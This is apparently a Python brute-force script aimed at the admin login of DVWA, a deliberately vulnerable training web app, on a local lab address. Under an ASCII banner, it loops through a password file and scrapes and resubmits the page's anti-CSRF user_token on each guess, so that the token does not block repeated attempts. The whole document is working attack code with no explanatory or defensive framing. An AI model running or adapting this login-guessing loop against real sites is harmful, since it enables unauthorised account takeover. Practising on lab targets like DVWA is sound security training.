print (""" 

██████  ██████  ██    ██ ████████ ███████     ███████  ██████  ██████   ██████ ███████ 
██   ██ ██   ██ ██    ██    ██    ██          ██      ██    ██ ██   ██ ██      ██      
██████  ██████  ██    ██    ██    █████       █████   ██    ██ ██████  ██      █████   
██   ██ ██   ██ ██    ██    ██    ██          ██      ██    ██ ██   ██ ██      ██      
██████  ██   ██  ██████     ██    ███████     ██       ██████  ██   ██  ██████ ███████                                                            
                                                                            
                        ALEN
        https://github.com/allensec01/tools-python


""")
import requests
from bs4 import BeautifulSoup
import re

url = "http://192.168.254.129/DVWA/vulnerabilities/brute/"

with open("pasword.txt") as file:
    password_lst = [line.strip() for line in file]


cookie ={"security":"high", "PHPSESSID":"fe7lq88c3uajg1n27epv0i8085"}
req = requests.get(url,cookies=cookie,allow_redirects=False)

soup = BeautifulSoup(req.text,'html.parser')
user_token = soup("input", {"name": "user_token"})[0]["value"]
#print(user_token,"#######")

for password in password_lst:
    param = {"username" : "admin" , "password" : password , "user_token": user_token,"Login" :"Login"}
    req = requests.get(url,params=param,cookies=cookie,allow_redirects=False)
    
    soup = BeautifulSoup(req.text,'html.parser')
    user_token = soup("input", {"name": "user_token"})[0]["value"]
    #print(user_token,"////////////////")
    
    txt = req.text
    if "Welcome" in txt:
        print("YOU ARE WINNING  **** password is : ",password)
        break
    else: 
        print("YOU ARE Failing  **** password is : ",password)

